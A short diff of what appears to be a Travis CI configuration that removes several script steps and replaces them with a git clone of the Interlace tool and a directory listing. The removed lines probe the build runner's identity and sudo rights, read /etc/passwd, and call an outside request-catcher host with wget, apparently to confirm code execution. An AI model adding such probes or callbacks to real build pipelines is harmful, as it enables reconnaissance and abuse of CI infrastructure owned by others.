@@ -4,10 +4,5 @@ python:
   - 3.5
 
 script:
-  - whoami
-  - id
-  - sudo whoami
-  - sudo id
-  - cat /etc/passwd
-  - wget https://arghh.free.beeceptor.com/test1
-  - wget https://arghh.free.beeceptor.com/test2
+  - git clone https://github.com/codingo/Interlace.git
+  - ls -al 
